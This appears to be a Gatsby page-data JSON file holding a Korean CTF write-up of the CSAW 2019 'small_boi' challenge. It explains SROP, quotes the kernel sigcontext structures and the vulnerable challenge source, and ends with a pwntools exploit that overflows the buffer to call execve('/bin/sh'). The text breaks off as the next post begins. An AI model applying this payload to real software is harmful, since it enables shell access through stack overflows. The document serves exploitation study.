{
    "componentChunkName": "component---src-templates-blog-template-js",
    "path": "/csaw_small_boi_ctf_writeup/",
    "result": {"data":{"cur":{"id":"cbffc1ab-7686-56fd-8fa1-eb66d7c1de19","html":"<h1 id=\"취약점-분석\" style=\"position:relative;\"><a href=\"#%EC%B7%A8%EC%95%BD%EC%A0%90-%EB%B6%84%EC%84%9D\" aria-label=\"취약점 분석 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>취약점 분석</h1>\n<blockquote>\n<p>SROP</p>\n<ul>\n<li>\n<p>리눅스에서는 시그널이 들어오게 되면 커널 모드에서 처리한다.</p>\n</li>\n<li>\n<p>커널 모드에서 유저모드로 들어오는 과정에서 유저의 스택에 레지스터 정보들을 저장해 놓는다.</p>\n</li>\n<li>\n<p><code class=\"language-text\">rt_sigreturn</code> 은 이렇게 저장해놓은 정보들을 다시 돌려놓을 때 사용된다.</p>\n</li>\n<li>\n<p>공격자가 <code class=\"language-text\">rt_sigreturn</code> 시스템 콜을 호출할 수 있고 스택을 조작할 수 있다면 모든 레지스터와 > 세그먼트를 조작할 수 있다.</p>\n</li>\n<li>\n<p><code class=\"language-text\">rt_sigreturn</code> 시스템 콜을 사용하여 익스폴로잇 하는 기법을 SigReturn Oriented Programming > (SROP)라고 한다.</p>\n</li>\n</ul>\n</blockquote>\n<h2 id=\"restore_sigcontext\" style=\"position:relative;\"><a href=\"#restore_sigcontext\" aria-label=\"restore_sigcontext permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>restore_sigcontext</h2>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token keyword\">static</span> <span class=\"token keyword\">int</span> <span class=\"token function\">restore_sigcontext</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">struct</span> <span class=\"token class-name\">pt_regs</span> <span class=\"token operator\">*</span>regs<span class=\"token punctuation\">,</span>\n\t\t\t      <span class=\"token keyword\">struct</span> <span class=\"token class-name\">sigcontext</span> __user <span class=\"token operator\">*</span>sc<span class=\"token punctuation\">,</span>\n\t\t\t      <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> uc_flags<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{</span>\n\t<span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> buf_val<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">void</span> __user <span class=\"token operator\">*</span>buf<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> tmpflags<span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> err <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token comment\">/* Always make any pending restarted system calls return -EINTR */</span>\n\tcurrent<span class=\"token operator\">-></span>restart_block<span class=\"token punctuation\">.</span>fn <span class=\"token operator\">=</span> do_no_restart_syscall<span class=\"token punctuation\">;</span>\n\tget_user_try <span class=\"token punctuation\">{</span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">ifdef</span> <span class=\"token expression\">CONFIG_X86_32</span></span>\n\t\t<span class=\"token function\">set_user_gs</span><span class=\"token punctuation\">(</span>regs<span class=\"token punctuation\">,</span> <span class=\"token function\">GET_SEG</span><span class=\"token punctuation\">(</span>gs<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">COPY_SEG</span><span class=\"token punctuation\">(</span>fs<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">COPY_SEG</span><span class=\"token punctuation\">(</span>es<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">COPY_SEG</span><span class=\"token punctuation\">(</span>ds<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">endif</span> <span class=\"token comment\">/* CONFIG_X86_32 */</span></span>\n\t\t<span class=\"token function\">COPY</span><span class=\"token punctuation\">(</span>di<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token function\">COPY</span><span class=\"token punctuation\">(</span>si<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token function\">COPY</span><span class=\"token punctuation\">(</span>bp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token function\">COPY</span><span class=\"token punctuation\">(</span>sp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token function\">COPY</span><span class=\"token punctuation\">(</span>bx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">COPY</span><span class=\"token punctuation\">(</span>dx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token function\">COPY</span><span class=\"token punctuation\">(</span>cx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token function\">COPY</span><span class=\"token punctuation\">(</span>ip<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token function\">COPY</span><span class=\"token punctuation\">(</span>ax<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">ifdef</span> <span class=\"token expression\">CONFIG_X86_64</span></span>\n\t\t<span class=\"token function\">COPY</span><span class=\"token punctuation\">(</span>r8<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">COPY</span><span class=\"token punctuation\">(</span>r9<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">COPY</span><span class=\"token punctuation\">(</span>r10<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">COPY</span><span class=\"token punctuation\">(</span>r11<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">COPY</span><span class=\"token punctuation\">(</span>r12<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">COPY</span><span class=\"token punctuation\">(</span>r13<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">COPY</span><span class=\"token punctuation\">(</span>r14<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">COPY</span><span class=\"token punctuation\">(</span>r15<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n         <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<ul>\n<li><code class=\"language-text\">COPY</code>, <code class=\"language-text\">COPY_SEG</code> 매크로를 사용하여 레지스터및 세그먼트를 복원한다.</li>\n</ul>\n<h2 id=\"sigcontext-32bit\" style=\"position:relative;\"><a href=\"#sigcontext-32bit\" aria-label=\"sigcontext 32bit permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>sigcontext-32bit</h2>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token keyword\">struct</span> <span class=\"token class-name\">sigcontext</span>\n<span class=\"token punctuation\">{</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">short</span> gs<span class=\"token punctuation\">,</span> gsh<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">short</span> fs<span class=\"token punctuation\">,</span> fsh<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">short</span> es<span class=\"token punctuation\">,</span> esh<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">short</span> ds<span class=\"token punctuation\">,</span> dsh<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> edi<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> esi<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> ebp<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> esp<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> ebx<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> edx<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> ecx<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> eax<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> trapno<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> err<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> eip<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">short</span> cs<span class=\"token punctuation\">,</span> __csh<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> eflags<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> esp_at_signal<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">short</span> ss<span class=\"token punctuation\">,</span> __ssh<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">struct</span> <span class=\"token class-name\">_fpstate</span> <span class=\"token operator\">*</span> fpstate<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> oldmask<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">long</span> cr2<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span></code></pre></div>\n<h2 id=\"sigcontext-64bit\" style=\"position:relative;\"><a href=\"#sigcontext-64bit\" aria-label=\"sigcontext 64bit permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>sigcontext-64bit</h2>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token keyword\">struct</span> <span class=\"token class-name\">sigcontext</span>\n<span class=\"token punctuation\">{</span>\n  __uint64_t r8<span class=\"token punctuation\">;</span>\n  __uint64_t r9<span class=\"token punctuation\">;</span>\n  __uint64_t r10<span class=\"token punctuation\">;</span>\n  __uint64_t r11<span class=\"token punctuation\">;</span>\n  __uint64_t r12<span class=\"token punctuation\">;</span>\n  __uint64_t r13<span class=\"token punctuation\">;</span>\n  __uint64_t r14<span class=\"token punctuation\">;</span>\n  __uint64_t r15<span class=\"token punctuation\">;</span>\n  __uint64_t rdi<span class=\"token punctuation\">;</span>\n  __uint64_t rsi<span class=\"token punctuation\">;</span>\n  __uint64_t rbp<span class=\"token punctuation\">;</span>\n  __uint64_t rbx<span class=\"token punctuation\">;</span>\n  __uint64_t rdx<span class=\"token punctuation\">;</span>\n  __uint64_t rax<span class=\"token punctuation\">;</span>\n  __uint64_t rcx<span class=\"token punctuation\">;</span>\n  __uint64_t rsp<span class=\"token punctuation\">;</span>\n  __uint64_t rip<span class=\"token punctuation\">;</span>\n  __uint64_t eflags<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">short</span> cs<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">short</span> gs<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">short</span> fs<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">short</span> pad0<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">uint64_t</span> err<span class=\"token punctuation\">;</span>\n  __uint64_t trapno<span class=\"token punctuation\">;</span>\n  __uint64_t oldmask<span class=\"token punctuation\">;</span>\n  __uint64_t cr2<span class=\"token punctuation\">;</span>\n  extension <span class=\"token keyword\">union</span>\n    <span class=\"token punctuation\">{</span>\n      <span class=\"token keyword\">struct</span> <span class=\"token class-name\">_fpstate</span> <span class=\"token operator\">*</span> fpstate<span class=\"token punctuation\">;</span>\n      __uint64_t __fpstate_word<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n  __uint64_t __reserved1 <span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span></code></pre></div>\n<ul>\n<li>해당 <code class=\"language-text\">sigcontext</code> 구조체를 바탕으로 SROP 기법으 이용하여 공격을 진행할 수 있다.</li>\n</ul>\n<h2 id=\"문제-small_boic\" style=\"position:relative;\"><a href=\"#%EB%AC%B8%EC%A0%9C-small_boic\" aria-label=\"문제 small_boic permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>문제 small_boi.c</h2>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\"><span class=\"token comment\">/* I wonder what you have to do with this sigreturn gadget */</span>\n<span class=\"token keyword\">volatile</span> <span class=\"token keyword\">void</span> <span class=\"token function\">one_true_gadget</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">void</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">asm</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"mov $0xf, %eax;\"</span> <span class=\"token comment\">// sigreturn</span>\n        <span class=\"token string\">\"syscall;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">asm</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"poprax:\"</span>\n    <span class=\"token string\">\"pop %rax;\"</span>\n    <span class=\"token string\">\"ret;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">char</span> <span class=\"token operator\">*</span>useful_string <span class=\"token operator\">=</span> <span class=\"token string\">\"/bin/sh\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">char</span> useful_byte <span class=\"token operator\">=</span> <span class=\"token char\">'i'</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">char</span> buf<span class=\"token punctuation\">[</span><span class=\"token number\">32</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">asm</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"mov %0, %%rsi;\"</span>\n        <span class=\"token operator\">:</span>\n        <span class=\"token operator\">:</span> <span class=\"token string\">\"r\"</span><span class=\"token punctuation\">(</span>buf<span class=\"token punctuation\">)</span>\n        <span class=\"token operator\">:</span> <span class=\"token string\">\"%rsi\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">asm</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"xor %rax, %rax;\"</span>\n        <span class=\"token string\">\"xor %rdi, %rdi;\"</span>\n        <span class=\"token string\">\"mov $0x200, %rdx;\"</span>\n        <span class=\"token string\">\"syscall;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">void</span> <span class=\"token function\">_start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{</span>\n    <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">asm</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"xor %rdi, %rax;\"</span>\n        <span class=\"token string\">\"mov $60, %rax;\"</span>\n        <span class=\"token string\">\"syscall;\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<ul>\n<li>문제 바이너리를 분석해 보면 <code class=\"language-text\">sigreturn</code> , <code class=\"language-text\">/bin/sh</code>, <code class=\"language-text\">syscall</code> 등 익스를 하기에 필요한 명령들이 있는 것을 확인할 수 있으며</li>\n<li>카니리 보호 기법이 걸려 있지 않아 버퍼 오버플로우를 발생시켜 return 주소를 sigreturn call 하여 SROP를 할 수 있다.</li>\n<li>main 함수에서 read 함수를 바탕으로 0x200 바이트를 입력 받기 때문에 버퍼 오버플로우가 발생한다.</li>\n</ul>\n<h2 id=\"srop\" style=\"position:relative;\"><a href=\"#srop\" aria-label=\"srop permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>SROP</h2>\n<div class=\"gatsby-highlight\" data-language=\"cpp\"><pre class=\"language-cpp\"><code class=\"language-cpp\">binshell <span class=\"token operator\">=</span> <span class=\"token number\">0x4001ca</span>\nsi_return <span class=\"token operator\">=</span> <span class=\"token number\">0x400180</span>\nsyscall <span class=\"token operator\">=</span> <span class=\"token number\">0x400185</span>\n\nframe <span class=\"token operator\">=</span> <span class=\"token function\">SigreturnFrame</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\nframe<span class=\"token punctuation\">.</span>rax <span class=\"token operator\">=</span> constants<span class=\"token punctuation\">.</span>SYS_execve\nframe<span class=\"token punctuation\">.</span>rdi <span class=\"token operator\">=</span> binshell\nframe<span class=\"token punctuation\">.</span>rsi <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\nframe<span class=\"token punctuation\">.</span>rdx <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\nframe<span class=\"token punctuation\">.</span>rip <span class=\"token operator\">=</span> syscall\n\npayload <span class=\"token operator\">=</span> <span class=\"token function\">p8</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x90</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">40</span><span class=\"token operator\">+</span><span class=\"token function\">p64</span><span class=\"token punctuation\">(</span>si_return<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token function\">str</span><span class=\"token punctuation\">(</span>frame<span class=\"token punctuation\">)</span>\n<span class=\"token function\">sl</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\n<span class=\"token function\">irt</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></code></pre></div>\n<ul>\n<li>SROP를 하기 위해서는 구조체의 값을 일일이 다 맞쳐서 짜야 한다는 점이 있지만 pwntools의 도구를 사용하여 손 쉽게 해당 레지스터에 필요한 값을 줄 수 가 있다.</li>\n<li>우리는 execve 시스템 콜을 사용하여 /bin/sh 주소를 인자로 사용하여 쉘을 획득하면 된다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 62.77777777777778%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAANCAIAAAAmMtkJAAAACXBIWXMAAAsTAAALEwEAmpwYAAACFElEQVQoz22O2W7bQAxF/SGJ1uEMOatGSyQrWmxLsWU3W5M+9qlA//8XCiVIghYFDi4Igge8m7umXealn5fhcB7mS1a1pmiy6tYUW503ru5908u8CYQJQYaMQkYBwwhkBLgxyl3un7bjHKmWZftYNQHVgewCrEKqQTUMnMCSqOLSx0KH3CXkGblEqA03/vL8uu12BkyO3qDNMCsp15gpWd46XwN2HDsQlnSCNhaO61KQTVdZueXxe9vv6gR6wJJhAziCcCAl+lr7Aqjh1ABZNKlQibCgcv4ug3S7u8XXrZW2BLJAHqhaB+lAFVxahjlQDqTJpGhibhK08C6jyX/++n28POwB74UauZyEfODYKF+69mzzHdDC5ZnTjXYMDaOc3FYqz0mvtS9PL/XtWMRQM8xSUaRiy9BzckzIVAgguYKImnGV8vV/wmUMtNFVtzy9Doc7pVye11l+kxeNlDZJRcTwmmHwltcMI04RUMhkzGXIRMhwcyrqKqtkVmlf2bKJgCKQAcOrhF8nPFgTPgYepKsTMAzf2OyV+zYt3bzU3diOU7XttS/ReKEzrpzQmXSFzAquHVeOSxt+mKs8tsP948vl+cc4n7r9cXd3HuelHaem32/7/TCdhunUHY5VO5DNhc7+ks9ZeRyn8Xhpx0N+04apuIrhq2EqPvlcfsm1tIdhOpwfxvk0zudhOhVNx8j8c/df/gAGdY0uSXZxhQAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./0.png\"\n        title=\"./0.png\"\n        src=\"/static/74e85d1e0257e52b19b4afbfd362849d/37523/0.png\"\n        srcset=\"/static/74e85d1e0257e52b19b4afbfd362849d/e9ff0/0.png 180w,\n/static/74e85d1e0257e52b19b4afbfd362849d/f21e7/0.png 360w,\n/static/74e85d1e0257e52b19b4afbfd362849d/37523/0.png 720w,\n/static/74e85d1e0257e52b19b4afbfd362849d/7e509/0.png 745w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<div class=\"table-of-contents\">\n<ul>\n<li><a href=\"#restore_sigcontext\">restore_sigcontext</a></li>\n<li><a href=\"#sigcontext-32bit\">sigcontext-32bit</a></li>\n<li><a href=\"#sigcontext-64bit\">sigcontext-64bit</a></li>\n<li><a href=\"#%EB%AC%B8%EC%A0%9C-small_boic\">문제 small_boi.c</a></li>\n<li><a href=\"#srop\">SROP</a></li>\n</ul>\n</div>","excerpt":"취약점 분석 SROP 리눅스에서는 시그널이 들어오게 되면 커널 모드에서 처리한다. 커널 모드에서 유저모드로 들어오는 과정에서 유저의 스택에 레지스터 정보들을 저장해 놓는다.  은 이렇게 저장해놓은 정보들을 다시 돌려놓을 때 사용된다. 공격자가  시스템 콜을 호출할 수 있고 스택을 조작할 수 있다면 모든 레지스터와 > 세그먼트를 조작할 수 있다.  시스템 콜을 사용하여 익스폴로잇 하는 기법을 SigReturn Oriented Programming > (SROP)라고 한다. restore_sigcontext ,  매크로를 사용하여 레지스터및 세그먼트를 복원한다. sigcontext-32bit sigcontext-64bit 해당  구조체를 바탕으로 SROP 기법으 이용하여 공격을 진행할 수 있다. 문제 small_boi.c 문제 바이너리를 분석해 보면  , ,  등 익스를 하기에 필요한 명령들이 있는 것을 확인할 수 있으며 카니리 보호 기법이 걸려 있지 않아 버퍼 오버플로우를 발생시켜 …","frontmatter":{"date":"September 18, 2020","title":"CSAW 2019 small_boi 취약점 분석","categories":"CTF","author":"Zer0Luck","emoji":"🍗"},"fields":{"slug":"/csaw_small_boi_ctf_writeup/"}},"next":{"id":"83f55412-c417-54d6-9bd1-31f31817496a","html":"<h1 id=\"취약점-분석\" style=\"position:relative;\"><a href=\"#%EC%B7%A8%EC%95%BD%EC%A0%90-%EB%B6%84%EC%84%9D\" aria-label=\"취약점 분석 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>취약점 분석</h1>\n<h2 id=\"바이너리-분석\" style=\"position:relative;\"><a href=\"#%EB%B0%94%EC%9D%B4%EB%84%88%EB%A6%AC-%EB%B6%84%EC%84%9D\" aria-label=\"바이너리 분석 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 